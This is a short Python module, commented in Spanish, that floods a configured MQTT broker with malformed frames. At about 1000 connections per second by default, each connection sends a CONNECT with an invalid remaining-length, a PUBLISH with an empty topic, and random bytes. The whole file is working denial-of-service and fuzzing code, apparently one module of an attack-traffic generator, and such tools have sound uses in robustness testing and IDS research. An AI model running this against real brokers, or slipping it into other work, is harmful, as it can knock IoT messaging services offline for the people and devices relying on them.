"""MQTT malformed — frames truncados / longitudes inválidas."""

from __future__ import annotations

import os
import socket
import time


def run(cfg: dict) -> int:
    target = (cfg["target_ip"], cfg["target_port"])
    rate = cfg.get("rate_pps", 1000)
    period = 1.0 / max(rate, 1.0)
    end = time.time() + cfg["duration_s"]
    while time.time() < end:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            s.connect(target)
            # variantes malformadas
            s.send(b"\x10\xFF\xFF\xFF\xFF" + os.urandom(20))   # remaining-length inválido
            s.send(b"\x30\x05\x00\x99\x00\x00")                # PUBLISH topic vacío
            s.send(os.urandom(64))                              # basura random
        except OSError:
            pass
        finally:
            s.close()
        time.sleep(period)
    return 0
